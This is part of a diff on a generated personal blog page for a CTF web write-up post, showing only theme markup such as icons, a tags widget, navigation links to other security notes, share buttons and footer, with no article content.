+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>赛车的终点是赛道的尽头</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
     </ul>
-</div>
+  </div>
+</section>
 
-
-        
-        
-            
-        
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Writeup/" style="font-size: 15px;" class="tags-cloud-5">Writeup</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;" class="tags-cloud-0">工具</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 20px;" class="tags-cloud-10">笔记</a>
     </div>
-</article>
-
-
-
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2022 tty. All Rights Reserved.
-    </span>
-</footer>
-
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2022/05/13/Webshell%E7%AC%94%E8%AE%B0/"
-                    data-tooltip="Webshell笔记"
-                    aria-label="FRÜHER: Webshell笔记"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2022/03/30/SSRF%E7%AC%94%E8%AE%B0/"
-                    data-tooltip="SSRF笔记"
-                    aria-label="NÄCHSTER: SSRF笔记"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                    title="Teilen auf Facebook"
-                    aria-label="Teilen auf Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                    title="Teilen auf Twitter"
-                    aria-label="Teilen auf Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                    title="Teilen auf Google Plus"
-                    aria-label="Teilen auf Google Plus"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
-    </ul>
-</div>
-
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                        aria-label="Teilen auf Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Teilen auf Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                        aria-label="Teilen auf Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Teilen auf Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://example.com/2022/04/16/2022-04-16-CTF2022-Web/"
-                        aria-label="Teilen auf Google Plus"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Teilen auf Google Plus</span>
-                    </a>
-                </li>
-            
-        </ul>
+  </div>
+</section>
     </div>
-
-
-            
-        </div>
-        
-
-
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">tty</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
+  </article>
 </div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
 
-            </div>
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
         
+      
         
+      
+        
+      
+        
+          <a href="https://github.com/ttycp3/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
     </div>
-</div>
-
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-
-<script src="/assets/js/script-gtexuswox0xbgkrqjf4bywpuyxsc2ri7ghrhv1qivj4cwnczc8qo9phljx3s.min.js"></script>
-
-<!--SCRIPTS END-->
-
+     
+    <p>&copy; 2022 <a href="/" target="_blank">tty</a></p>
 
     
 
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
 
 
 
-    </body>
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
 </html>
